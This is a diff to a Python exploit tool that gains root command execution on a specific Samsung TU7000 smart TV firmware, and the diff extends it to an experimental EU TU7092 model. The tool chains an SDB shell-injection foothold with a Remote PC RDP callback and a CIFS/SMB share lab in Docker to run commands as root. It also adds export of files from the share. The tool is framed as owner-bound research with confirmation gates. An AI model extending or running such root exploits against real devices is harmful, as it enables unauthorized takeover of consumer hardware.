@@ -1,6 +1,6 @@
-"""TU7000 T-KTSU2AKUC-2743.0 Remote PC/CIFS one-shot root route.
+"""TU7000 US and experimental TU7092 EU Remote PC/CIFS one-shot root route.
 
-This route is bound to one owner-observed target: an UN65TU7000FXZA running
+The validated route is bound to one owner-observed target: an UN65TU7000FXZA running
 build T-KTSU2AKUC-REL-202607021959 (release T-KTSU2AKUC-2743.0). It uses the
 SDB package-name foothold only for read-only assessment and for the two-push
 UID-0 classifier. Root command execution comes from the reviewed Remote PC
@@ -20,12 +20,13 @@ import os
 import re
 import secrets
 import select
+import shutil
 import socket
 import subprocess
 import sys
 import tempfile
 import time
-from dataclasses import dataclass
+from dataclasses import dataclass, replace
 from pathlib import Path, PurePosixPath
 
 from .compatibility import (
@@ -40,6 +41,17 @@ MODEL = "UN65TU7000FXZA"
 FIRMWARE = "T-KTSU2AKUC-2743.0"
 TESTED_BUILD = "T-KTSU2AKUC-REL-202607021959"
 CONFIRMATION = "TU7000-T-KTSU2AKUC-2743.0"
+EU_MODEL = "UE55TU7092UXXH"
+EU_FIRMWARE = "T-KTSU2DEUC-2743.0"
+EU_BUILD = "T-KTSU2DEUC-REL-202607022000"
+EU_CONFIRMATION = "TU7092-EU-T-KTSU2DEUC-2743.0"
+# Keep the validated US build as the evidence anchor. EU is never "tested".
+EU_PROFILE = replace(
+    TU7000_PROFILE,
+    name="tu7092-eu-experimental",
+    build_family="T-KTSU2DEUC-REL-",
+    compatible_builds=frozenset({EU_BUILD}),
+)
 LAB_USER = "owner"
 STAGING_DIRECTORY = PurePosixPath("/home/owner/share/tmp")
 SDK_STAGING_DIRECTORY = PurePosixPath("/home/owner/share/tmp/sdk_tools")
@@ -116,12 +128,19 @@ class Tu7000Assessment:
     compatibility: TargetAssessment
     artifacts: tuple[ArtifactVerification, ...]
     system_hashes: str
+    experimental_eu: bool = False
+
+    @property
+    def firmware(self) -> str:
+        return EU_FIRMWARE if self.experimental_eu else FIRMWARE
 
     def render(self) -> str:
         lines = [
             self.compatibility.render(),
             f"Model: {self.model}",
-            f"Firmware: {FIRMWARE}",
+            f"Firmware: {self.firmware}",
+            f"Experimental EU: {self.experimental_eu}",
+            "Root validation: not established by preflight",
         ]
         for artifact in self.artifacts:
             state = "verified" if artifact.verified else "mismatch"
@@ -131,7 +150,10 @@ class Tu7000Assessment:
     def to_dict(self) -> dict[str, object]:
         return {
             "model": self.model,
-            "firmware": FIRMWARE,
+            "firmware": self.firmware,
+            "experimental_eu": self.experimental_eu,
+            "root_validated_by_preflight": False,
+            "profile": self.compatibility.profile,
             "status": self.compatibility.status.value,
             "build": self.compatibility.fingerprint.build_id,
             "kernel": self.compatibility.fingerprint.kernel_release,
@@ -322,22 +344,35 @@ def assess_target(
     sdb_timeout: float = DEFAULT_SDB_TIMEOUT,
     client: SdbClient | None = None,
     require_tested: bool = True,
+    experimental_eu: bool = False,
 ) -> Tu7000Assessment:
     ipaddress.IPv4Address(tv_host)
     client = client or SdbClient(find_sdb(), tv_host, timeout=sdb_timeout)
     client.connect()
     client.require_device()
     model = client.reported_model()
-    if model != MODEL:
+    expected_model = EU_MODEL if experimental_eu else MODEL
+    if model != expected_model:
         raise CifsRouteError(
-            f"target reports model {model or 'unknown'}, expected {MODEL}"
+            f"target reports model {model or 'unknown'}, expected {expected_model}"
         )
     client.require_shell_injection()
     output = _capture(client, PROBE_COMMAND, sdb_timeout)
-    assessment = TU7000_PROFILE.assess(output)
+    profile = EU_PROFILE if experimental_eu else TU7000_PROFILE
+    assessment = profile.assess(output)
     try:
         assessment.require_compatible()
-        if require_tested:
+        if experimental_eu:
+            if assessment.fingerprint.build_id != EU_BUILD:
+                raise CifsRouteError(
+                    f"experimental EU route requires exact build {EU_BUILD}"
+                )
+            if assessment.fingerprint.kernel_release != TU7000_PROFILE.tested_kernel:
+                raise CifsRouteError(
+                    "experimental EU route requires exact kernel "
+                    + TU7000_PROFILE.tested_kernel
+                )
+        elif require_tested:
             assessment.require_tested("TU7000 CIFS route")
     except TargetCompatibilityError as error:
         raise CifsRouteError(str(error)) from error
@@ -357,6 +392,7 @@ def assess_target(
         compatibility=assessment,
         artifacts=artifacts,
         system_hashes=system_hashes,
+        experimental_eu=experimental_eu,
     )
 
 
@@ -580,6 +616,7 @@ class CifsLab:
         bind: str,
         rdp_port: int,
         smb_port: int,
+        export_share: Path | None = None,
         image: str | None = None,
         runner: Runner | None = None,
     ) -> None:
@@ -593,6 +630,7 @@ class CifsLab:
         self.bind = bind
         self.rdp_port = rdp_port
         self.smb_port = smb_port
+        self.export_share = export_share
         self.runner = runner or Runner()
         self.context_sha256 = lab_context_sha256()
         self.image = image or (
@@ -602,6 +640,7 @@ class CifsLab:
         self._cleanup_armed = False
         self._image_id: str | None = None
         self._rdp_login_baseline = 0
+        self._share_dir: Path | None = None
 
     @property
     def client_container(self) -> str:
@@ -717,6 +756,10 @@ class CifsLab:
             path = directory / name
             path.write_text(value, encoding="utf-8")
             os.chmod(path, 0o600)
+        if self.export_share is not None:
+            path = directory / "share_writable"
+            path.write_text("1", encoding="ascii")
+            os.chmod(path, 0o600)
         return directory
 
     def start(self) -> None:
@@ -731,6 +774,7 @@ class CifsLab:
             raise CifsRouteError("lab source changed after its image was built")
         self._image_id = self._verified_image_id(self._image_id)
         secrets_dir = self._write_secrets()
+        self._share_dir = Path(tempfile.mkdtemp(prefix="tizenpwn-share-"))
         arguments = (
             "docker",
             "run",
@@ -747,6 +791,8 @@ class CifsLab:
             f"{self.bind}:{self.smb_port}:445",
             "--mount",
             f"type=bind,source={secrets_dir},target=/run/cifs-lab-secrets,readonly",
+            "--mount",
+            f"type=bind,source={self._share_dir},target=/srv/cifs-lab-share",
             "--label",
             f"{IMAGE_LABEL}={self.context_sha256}",
             self._image_id,
@@ -755,6 +801,14 @@ class CifsLab:
         self.runner.run(arguments, timeout=60)
         self._wait_healthy()
         self._require_exact_publish()
+
+    def export_share_files(self) -> None:
+        if self.export_share is None or self._share_dir is None:
+            return
+        self.export_share.mkdir(parents=True, exist_ok=True)
+        for entry in self._share_dir.iterdir():
+            if entry.is_file():
+                shutil.copy2(entry, self.export_share / entry.name)
 
     def _require_container_absent(self, name: str) -> None:
         result = self.runner.run(
@@ -995,6 +1049,14 @@ class CifsLab:
             )
         return result.stdout + "\n" + result.stderr
 
+    @staticmethod
+    def smb_event_counts(logs: str) -> tuple[int, int]:
+        """Return the reviewed SMB marker count and a format-diagnostic count."""
+        return (
+            logs.count("NetrShareEnum Level: 1"),
+            logs.count("NetrShareEnum"),
+        )
+
     def rdp_logs(self) -> str:
         result = self.runner.run(
             (
@@ -1084,6 +1146,9 @@ class CifsLab:
             if self._temporary is not None:
                 self._temporary.cleanup()
                 self._temporary = None
+            if self._share_dir is not None:
+                shutil.rmtree(self._share_dir, ignore_errors=True)
+                self._share_dir = None
         if errors:
             raise CifsRouteError(
                 "one or more exact-name lab containers survived cleanup"
@@ -1261,7 +1326,7 @@ def _form_card(
     fingerprint: str,
 ) -> None:
     print("\nPRIVATE ONE-TIME REMOTE PC FORM VALUES (do not record this screen)")
-    print(f"  TV: {assessment.model} / {FIRMWARE}")
+    print(f"  TV: {assessment.model} / {assessment.firmware}")
     print(f"  PC/Profile address: {callback_host}")
     print("  Protocol: RDP (not VNC)")
     print(f"  Username: {LAB_USER}")
@@ -1279,7 +1344,7 @@ def _agent_form_card(
     fingerprint: str,
 ) -> None:
     print("\nPRIVATE ONE-TIME REMOTE PC FORM VALUES (do not record this screen)")
-    print(f"  TV: {assessment.model} / {FIRMWARE}")
+    print(f"  TV: {assessment.model} / {assessment.firmware}")
     print(f"  PC/Profile address: {callback_host}")
     print("  Protocol: RDP (not VNC)")
     print(f"  Username: {LAB_USER}")
@@ -1362,10 +1427,12 @@ def execute_probe(
     runner: Runner | None = None,
     client: SdbClient | None = None,
     sleep=time.sleep,
+    experimental_eu: bool = False,
 ) -> dict[str, object]:
-    if confirm != CONFIRMATION:
+    confirmation = EU_CONFIRMATION if experimental_eu else CONFIRMATION
+    if confirm != confirmation:
         raise CifsRouteError(
-            f"live mode requires --confirm {CONFIRMATION}"
+            f"live mode requires --confirm {confirmation}"
         )
     if not accept_saved_profile:
         raise CifsRouteError(
@@ -1384,7 +1451,10 @@ def execute_probe(
     prompt = prompt or ConsolePrompter(accept_timeout)
     runner = runner or Runner()
     client = client or SdbClient(find_sdb(), tv_host, timeout=sdb_timeout)
-    assessment = assess_target(tv_host, sdb_timeout=sdb_timeout, client=client)
+    assessment = assess_target(
+        tv_host, sdb_timeout=sdb_timeout, client=client,
+        experimental_eu=experimental_eu,
+    )
     identity = fresh_identity()
     lab = CifsLab(
         identity,
@@ -1397,7 +1467,8 @@ def execute_probe(
     evidence: dict[str, object] = {
         "model": assessment.model,
         "host": tv_host,
-        "firmware": FIRMWARE,
+        "firmware": assessment.firmware,
+        "experimental_eu": assessment.experimental_eu,
         "build": assessment.compatibility.fingerprint.build_id,
         "route": "remotepc-cifs",
         "confirmation": confirm,
@@ -1432,18 +1503,21 @@ def execute_probe(
         )
         lab.require_rdp_login()
         evidence["rdp_logins"] = 1
-        smb_before = lab.logs().count("NetrShareEnum Level: 1")
+        smb_before, smb_before_generic = lab.smb_event_counts(lab.logs())
         prompt(
             "Reveal the TV's top toolbar, click Shared Folder exactly once, "
             "then return here. A wrong or repeated click is terminal.",
             "CLICKED",
         )
         sleep(2)
-        smb_after = lab.logs().count("NetrShareEnum Level: 1")
+        smb_after, smb_after_generic = lab.smb_event_counts(lab.logs())
         if smb_after != smb_before + 1:
             raise CifsRouteError(
                 "the single SMB observation window did not contain exactly "
-                "one share enumeration"
+                "one share enumeration "
+                f"(reviewed-marker delta={smb_after - smb_before}; "
+                f"generic NetrShareEnum delta="
+                f"{smb_after_generic - smb_before_generic})"
             )
         evidence["smb_enumeration_events"] = 1
         if not classify_uid0_once(client, identity):
@@ -1523,14 +1597,17 @@ def execute_command(
     image: str | None = None,
     agent_timeout: float = DEFAULT_AGENT_TIMEOUT,
     accept_timeout: float = DEFAULT_ACCEPT_TIMEOUT,
+    export_share: Path | None = None,
     prompt: ConsolePrompter | None = None,
     runner: Runner | None = None,
     client: SdbClient | None = None,
     sleep=time.sleep,
+    experimental_eu: bool = False,
 ) -> dict[str, object]:
-    if confirm != CONFIRMATION:
+    confirmation = EU_CONFIRMATION if experimental_eu else CONFIRMATION
+    if confirm != confirmation:
         raise CifsRouteError(
-            f"live mode requires --confirm {CONFIRMATION}"
+            f"live mode requires --confirm {confirmation}"
         )
     if not accept_saved_profile:
         raise CifsRouteError(
@@ -1551,13 +1628,17 @@ def execute_command(
     prompt = prompt or ConsolePrompter(accept_timeout)
     runner = runner or Runner()
     client = client or SdbClient(find_sdb(), tv_host, timeout=sdb_timeout)
-    assessment = assess_target(tv_host, sdb_timeout=sdb_timeout, client=client)
+    assessment = assess_target(
+        tv_host, sdb_timeout=sdb_timeout, client=client,
+        experimental_eu=experimental_eu,
+    )
     identity = fresh_agent_identity()
     lab = CifsLab(
         identity,
         bind=bind,
         rdp_port=rdp_port,
         smb_port=smb_port,
+        export_share=export_share,
         image=image,
         runner=runner,
     )
@@ -1565,7 +1646,8 @@ def execute_command(
     evidence: dict[str, object] = {
         "model": assessment.model,
         "host": tv_host,
-        "firmware": FIRMWARE,
+        "firmware": assessment.firmware,
+        "experimental_eu": assessment.experimental_eu,
         "build": assessment.compatibility.fingerprint.build_id,
         "route": "remotepc-cifs",
         "confirmation": confirm,
@@ -1606,18 +1688,21 @@ def execute_command(
         )
         lab.require_rdp_login()
         evidence["rdp_logins"] = 1
-        smb_before = lab.logs().count("NetrShareEnum Level: 1")
+        smb_before, smb_before_generic = lab.smb_event_counts(lab.logs())
         prompt(
             "Reveal the TV's top toolbar, click Shared Folder exactly once, "
             "then return here. A wrong or repeated click is terminal.",
             "CLICKED",
         )
         sleep(2)
-        smb_after = lab.logs().count("NetrShareEnum Level: 1")
+        smb_after, smb_after_generic = lab.smb_event_counts(lab.logs())
         if smb_after != smb_before + 1:
             raise CifsRouteError(
                 "the single SMB observation window did not contain exactly "
-                "one share enumeration"
+                "one share enumeration "
+                f"(reviewed-marker delta={smb_after - smb_before}; "
+                f"generic NetrShareEnum delta="
+                f"{smb_after_generic - smb_before_generic})"
             )
         evidence["smb_enumeration_events"] = 1
         root_identity, results = agent.accept_and_run(
@@ -1628,6 +1713,7 @@ def execute_command(
         evidence["root_identity"] = root_identity
         evidence["commands"] = results
         evidence["classification"] = "authenticated-root-command"
+        lab.export_share_files()
         return evidence
     except BaseException as error:
         primary_error = error
